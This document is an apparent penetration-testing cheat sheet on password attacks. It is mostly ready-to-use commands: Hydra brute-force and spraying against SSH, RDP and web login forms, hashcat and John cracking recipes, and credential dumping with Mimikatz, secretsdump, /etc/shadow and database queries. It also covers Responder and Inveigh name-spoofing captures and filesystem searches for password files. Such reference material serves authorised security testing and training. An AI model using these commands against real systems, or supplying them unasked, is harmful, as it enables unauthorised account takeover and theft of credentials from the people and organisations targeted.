# Password Attacks

## Overview

Passwords continue to be the primary authentication method across most systems and services. This cheat sheet covers various techniques used to compromise password-based security mechanisms, from targeting live network services to cracking stored password hashes.

This reference guide covers the following sections:

- Attacking Network Service Logins
- Password Cracking Fundamentals  
- Working with Password Hashes

This document provides practical commands, tools, and techniques for testing password strength through network-based attacks, different password cracking approaches, and methods to identify and exploit various hash formats found in modern systems.

## Table of Contents

- [1. Attacking Network Service Logins](#1-attacking-network-service-logins)
- [2. Password Cracking Fundamentals](#2-password-cracking-fundamentals)
- [3. Working with Password Hashes](#3-working-with-password-hashes)

---

## 1. Attacking Network Service Logins

Network services with authentication mechanisms are primary targets for credential attacks. Two main approaches exist: brute-force attacks (testing all possible combinations) and dictionary attacks (using wordlists of common passwords).

### 1.1 SSH Attacks

**Target Verification**
```bash
# Check SSH service availability
nmap -sV -p 2222 target_ip
```

**Dictionary Attack with Hydra**
```bash
# Prepare rockyou wordlist
cd /usr/share/wordlists/
sudo gzip -d rockyou.txt.gz

# Single user attack
hydra -l username -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://target_ip

# Multiple users attack
hydra -L users.txt -P passwords.txt ssh://target_ip
```

**Key Parameters**
- `-l`: Single username
- `-L`: Username list file
- `-P`: Password list file
- `-s`: Custom port
- `-t`: Number of parallel tasks

### 1.2 RDP Password Spraying

Password spraying uses one password against multiple usernames, effective when passwords are obtained from breaches or leaks.

**Prepare Username List**
```bash
# Add usernames to existing list
echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt
```

**Execute Password Spray**
```bash
# Single password against username list
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "password123" rdp://target_ip

# Custom username list
hydra -L custom_users.txt -p "SuperS3cure1337#" rdp://target_ip
```

**Considerations**
- Account lockout policies may trigger after failed attempts
- Dictionary attacks generate significant logs and network traffic
- Limit attack scope to avoid production system disruption

### 1.3 HTTP POST Login Forms

Web application login forms require additional reconnaissance to capture request format and failure indicators.

**Information Gathering**
1. Intercept login request with Burp Suite
2. Identify POST request body format
3. Capture failed login response message

**Example Request Analysis**
```
POST /index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

fm_usr=user&fm_pwd=password
```

**Failed Login Indicator**
```
"Login failed. Invalid username or password"
```

**Hydra HTTP POST Attack**
```bash
# Basic HTTP POST form attack
hydra -l user -P /usr/share/wordlists/rockyou.txt target_ip http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"

# With custom parameters
hydra -l admin -P passwords.txt target_ip http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

**HTTP POST Form Syntax**
```
http-post-form "path:post_body:failure_string"
```
- `path`: Location of login form
- `post_body`: Request body with ^USER^ and ^PASS^ placeholders
- `failure_string`: Text indicating failed login

**Common Default Accounts**
- Web applications: admin, user, administrator
- Linux systems: root
- Windows systems: Administrator

**Defense Considerations**
- Web Application Firewalls (WAF) detect and block brute force attempts
- fail2ban and similar tools lock accounts after failed attempts
- Rate limiting and CAPTCHA mechanisms prevent automated attacks

---

## 2. Password Cracking Fundamentals

Password cracking attacks target stored password hashes rather than live authentication services. Unlike network attacks, hash cracking doesn't generate network traffic, lock accounts, or trigger traditional defensive mechanisms.

### 2.1 Encryption vs Hashing

**Encryption** (Two-way function)
- Symmetric: Same key for encryption/decryption (AES)
- Asymmetric: Public/private key pairs (RSA)
- Reversible with correct key

**Hashing** (One-way function)
- Fixed-length output regardless of input size
- Same input always produces same hash
- Computationally infeasible to reverse
- Examples: MD5, SHA1, SHA256

**Hash Verification Example**
```bash
# Generate hash examples
echo -n "secret" | sha256sum
echo -n "secret1" | sha256sum

# Compare outputs
# secret:  2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b
# secret1: 5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6
```

### 2.2 Tool Comparison

**Hashcat**
- Primarily GPU-based
- Requires OpenCL or CUDA drivers
- Faster for most algorithms
- Better for modern hash types

**John the Ripper (JtR)**
- CPU-focused with GPU support
- Works without additional drivers
- Better for complex/slow algorithms (bcrypt)
- Better SSH key support

### 2.3 Cracking Time Calculation

**Formula**: Cracking Time = Keyspace ÷ Hash Rate

**Keyspace Calculation**
```bash
# Character set size
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
# Output: 62

# 5-character password keyspace
python3 -c "print(62**5)"
# Output: 916132832

# 8-character password keyspace  
python3 -c "print(62**8)"
# Output: 218340105584896
```

**Benchmark Hash Rates**
```bash
# Test system capabilities
hashcat -b

# Example GPU vs CPU comparison (SHA256):
# GPU: 9,276.3 MH/s
# CPU: 134.2 MH/s
```

**Time Calculations**
```bash
# 5-character password (SHA256)
python3 -c "print(916132832 / 9276300000)"  # GPU: ~0.1 seconds
python3 -c "print(916132832 / 134200000)"   # CPU: ~6.8 seconds

# 8-character password (SHA256)  
python3 -c "print(218340105584896 / 9276300000)"  # GPU: ~6.5 hours
```

### 2.4 Rule-Based Attacks

Rules mutate existing passwords to match password policies without expanding wordlists manually.

**Basic Rule Functions**
- `c`: Capitalize first character
- `$X`: Append character X
- `^X`: Prepend character X
- `$1`: Append "1"
- `$!`: Append "!"

**Create Custom Rules**
```bash
# Simple rule file
echo \$1 > demo.rule

# Test rule on wordlist
hashcat -r demo.rule --stdout demo.txt

# Multiple functions (same line = consecutive)
echo '$1 c $!' > complex.rule

# Multiple rules (separate lines = different mutations)
cat > multi.rule << EOF
$1 c $!
$2 c $@
$1$2$3 c $#
EOF
```

**Rule Execution Example**
```bash
# Create demo wordlist
cat > demo.txt << EOF
password
princess
computer
EOF

# Apply capitalization + append "1" + append "!"
hashcat -r demo.rule --stdout demo.txt
# Output: Password1!, Princess1!, Computer1!
```

**Practical Hash Cracking**
```bash
# Crack MD5 hash with rules
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r rule.file --force

# Example with specific hash
echo "f621b6c9eab51a3e2f4e167fee4c6860" > target.hash
hashcat -m 0 target.hash rockyou.txt -r custom.rule --force
```

**Predefined Rules Location**
```bash
ls -la /usr/share/hashcat/rules/
# Key files:
# best64.rule - General purpose
# rockyou-30000.rule - Optimized for rockyou.txt
# dive.rule - Comprehensive mutations
```

### 2.5 Cracking Methodology

**Step 1: Extract Hashes**
- Database dumps
- Configuration files  
- Memory dumps
- Network captures

**Step 2: Format Hashes**
```bash
# Identify hash type
hashid hash_value
hash-identifier

# Format for tools
keepass2john Database.kdbx > keepass.hash
ssh2john id_rsa > ssh.hash
```

**Step 3: Calculate Cracking Time**
- Determine feasibility
- Consider hardware limitations
- Plan timeline within engagement scope

**Step 4: Prepare Wordlist**
- Research password policies
- Create targeted rules
- Use multiple wordlists if needed

**Step 5: Execute Attack**
- Verify hash format
- Confirm hash type
- Monitor progress

### 2.6 Password Manager Attacks

**KeePass Database Cracking**
```bash
# Find database files
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Format for cracking
keepass2john Database.kdbx > keepass.hash

# Remove filename prefix
sed -i 's/^[^:]*://' keepass.hash

# Identify hash mode
hashcat --help | grep -i "keepass"
# Mode: 13400

# Crack with rules
hashcat -m 13400 keepass.hash rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

### 2.7 SSH Private Key Passphrase

**Extract and Format**
```bash
# Convert private key to hash
ssh2john id_rsa > ssh.hash

# Remove filename prefix
sed -i 's/^[^:]*://' ssh.hash

# Determine mode ($6$ = mode 22921)
hashcat -h | grep -i "ssh"
```

**Create Targeted Rules**
```bash
# Based on password policy: 3 numbers, capital letter, special character
cat > ssh.rule << EOF
c $1 $3 $7 $!
c $1 $3 $7 $@  
c $1 $3 $7 $#
EOF

# Create custom wordlist from intelligence
cat > ssh.passwords << EOF
window
dave
superdave
umbrella
EOF
```

**Handle Tool Limitations**
```bash
# If Hashcat fails with "Token length exception"
# Use John the Ripper instead

# Add rules to John configuration
cat >> /etc/john/john.conf << EOF
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
EOF

# Crack with John
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

**Use Cracked Passphrase**
```bash
# Set correct permissions
chmod 600 id_rsa

# Connect with private key
ssh -i id_rsa -p 2222 user@target_ip
# Enter passphrase when prompted
```

### Key Considerations

- **Password Policies**: Research target requirements (length, complexity, special characters)
- **Human Behavior**: Users append numbers/symbols, capitalize first letter
- **Tool Selection**: Use multiple tools for different hash types and scenarios
- **Time Management**: Balance cracking time with engagement duration
- **Hardware**: Consider GPU upgrades or cloud instances for intensive tasks

---

## 3. Working with Password Hashes

Working with password hashes involves identifying hash types, understanding different implementations across operating systems, and applying appropriate cracking techniques for each hash format.

### 3.1 Hash Identification

Proper hash identification is critical before attempting to crack passwords.

**Hash Identification Tools**
```bash
# Interactive hash identification
hash-identifier
hashid hash_value

# Multiple hashes from file
hashid -m hashes.txt

# Output with hashcat modes
hashid -mj hashes.txt
```

**Manual Identification by Length**
```
MD5:          32 characters
SHA1:         40 characters  
SHA256:       64 characters
SHA512:       128 characters
NTLM:         32 characters (Windows)
LM:           32 characters (Legacy Windows)
```

**Common Hash Formats**
```
MD5:          5d41402abc4b2a76b9719d911017c592
SHA1:         aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d
NTLM:         b4b9b02e6f09a9bd760f388b67351e2b
bcrypt:       $2a$10$N9qo8uLOickgx2ZMRZoMyeIjbpi4e7k8m...
md5crypt:     $1$salt$qJH7.N4xYta3aEG/dfqo/0
sha512crypt:  $6$salt$IxDD3jeSOb5eB1CX5LBsqZ...
```

### 3.2 Windows Hash Types

Windows systems use various authentication mechanisms with different hash formats.

**NTLM Hash Cracking**
```bash
# Hashcat NTLM mode: 1000
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt

# John the Ripper NTLM
john --format=NT ntlm_hashes.txt

# NTLM with rules
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt -r best64.rule
```

**LM Hash Characteristics**
- Maximum 14 characters
- Case insensitive
- Split into two 7-character halves
- Weak DES-based encryption

```bash
# Hashcat LM mode: 3000
hashcat -m 3000 -a 3 lm_hashes.txt ?a?a?a?a?a?a?a

# John the Ripper LM
john --format=LM lm_hashes.txt
```

**NetNTLMv2 Challenge-Response**
```bash
# Format: username::domain:challenge:response
# Hashcat mode: 5600
hashcat -m 5600 -a 0 netntlmv2.txt rockyou.txt

# From Responder captures
hashcat -m 5600 -a 0 Responder-Session.txt rockyou.txt
```

### 3.3 Hash Extraction Techniques

**Windows Hash Extraction**
```bash
# Mimikatz - extract from memory
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Extract SAM database
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Registry extraction
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

# Impacket secretsdump
python3 secretsdump.py -sam sam.hive -system system.hive LOCAL

# Domain Controller NTDS.dit
python3 secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

**Linux/Unix Hash Extraction**
```bash
# Direct access (requires root)
cat /etc/shadow

# Extract user hashes only
awk -F: '($2 != "*" && $2 != "!" && $2 != "") {print $1":"$2}' /etc/shadow

# Combine passwd and shadow
unshadow /etc/passwd /etc/shadow > combined.txt

# John format for combined file
john combined.txt
```

### 3.4 Unix/Linux Hash Types

**MD5crypt ($1$)**
```bash
# Format: $1$salt$hash
# Hashcat mode: 500
hashcat -m 500 -a 0 md5crypt_hashes.txt rockyou.txt

# John the Ripper
john --format=md5crypt shadow_hashes.txt
```

**SHA256crypt ($5$)**
```bash
# Format: $5$rounds=rounds$salt$hash
# Hashcat mode: 7400
hashcat -m 7400 -a 0 sha256crypt_hashes.txt rockyou.txt

# With custom rounds
hashcat -m 7400 -a 0 '$5$rounds=5000$salt$...' rockyou.txt
```

**SHA512crypt ($6$)**
```bash
# Format: $6$rounds=rounds$salt$hash
# Hashcat mode: 1800
hashcat -m 1800 -a 0 sha512crypt_hashes.txt rockyou.txt

# John the Ripper
john --format=sha512crypt shadow_hashes.txt
```

**bcrypt ($2a$, $2b$, $2y$)**
```bash
# Format: $2a$rounds$salt$hash
# Hashcat mode: 3200
hashcat -m 3200 -a 0 bcrypt_hashes.txt rockyou.txt

# Note: bcrypt is intentionally slow
# Rounds parameter controls difficulty (4-31)
```

### 3.5 Application Hash Types

**WordPress (phpass)**
```bash
# Format: $P$BroundsSalt22CharacterHash
# Hashcat mode: 400
hashcat -m 400 -a 0 wordpress_hashes.txt rockyou.txt
```

**MySQL Hashes**
```bash
# MySQL < 4.1 (16 hex characters)
# Hashcat mode: 200
hashcat -m 200 -a 0 mysql_old_hashes.txt rockyou.txt

# MySQL >= 4.1 (40 hex characters with asterisk)
# Hashcat mode: 300
hashcat -m 300 -a 0 mysql_new_hashes.txt rockyou.txt
```

**Database Hash Extraction**
```sql
-- MySQL hash extraction
SELECT user, authentication_string FROM mysql.user;

-- PostgreSQL hash extraction  
SELECT usename, passwd FROM pg_shadow;

-- MSSQL hash extraction
SELECT name, password_hash FROM sys.sql_logins;
```

### 3.6 Specialized Hash Formats

**KeePass Database**
```bash
# Extract and format
keepass2john Database.kdbx > keepass.hash

# Remove filename prefix
sed -i 's/^[^:]*://' keepass.hash

# Hashcat mode: 13400
hashcat -m 13400 keepass.hash rockyou.txt -r rockyou-30000.rule
```

**SSH Private Key**
```bash
# Extract and format
ssh2john id_rsa > ssh.hash

# Remove filename prefix
sed -i 's/^[^:]*://' ssh.hash

# Identify mode ($6$ = 22921)
hashcat -h | grep -i "ssh"

# If Hashcat fails, use John the Ripper
john --wordlist=passwords.txt --rules=custom ssh.hash
```

### 3.7 Advanced Techniques

**Memory Dump Analysis**
```bash
# Volatility Framework - Windows hashes
python3 vol.py -f memory.dmp windows.hashdump

# Extract cached credentials
python3 vol.py -f memory.dmp windows.cachedump

# LSA secrets extraction
python3 vol.py -f memory.dmp windows.lsadump
```

**Network Capture Hashes**
```bash
# Responder - capture Windows authentication
responder -I eth0 -w -r -f

# Inveigh - PowerShell LLMNR/NBT-NS spoofer
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -FileOutput Y

# Packet capture for analysis
tcpdump -i eth0 -w capture.pcap port 445 or port 139
```

**Configuration File Hunting**
```bash
# WordPress configuration
grep -r "DB_PASSWORD" /var/www/html/

# General password hunting
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.config" -exec grep -l "hash" {} \; 2>/dev/null

# Database files
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
```

### 3.8 Hash Cracking Strategy

**Progressive Approach**
1. **Quick wins**: Dictionary attack with common wordlists
2. **Rule-based**: Apply mutations to base wordlists  
3. **Hybrid**: Combine dictionary + brute force
4. **Brute force**: Systematic character combinations

**Tool Selection Guidelines**
- **Hashcat**: GPU-accelerated, modern hash types, faster for most algorithms
- **John the Ripper**: CPU-focused, better SSH key support, handles legacy formats
- **Multiple tools**: Some hash types only supported by specific tools

**Performance Optimization**
```bash
# GPU optimization
hashcat -m 0 -a 0 hashes.txt rockyou.txt -O -w 4

# Benchmark system
hashcat -b -m 0

# Monitor GPU usage
nvidia-smi -l 1
```

### Key Considerations

- **Hash Type Verification**: Always confirm hash type before extensive cracking attempts
- **Tool Limitations**: Different tools support different hash formats and algorithms
- **Time Management**: Balance cracking time with engagement duration
- **Resource Planning**: Consider hardware requirements for different hash types
- **Multiple Approaches**: Combine network attacks with offline hash cracking for comprehensive coverage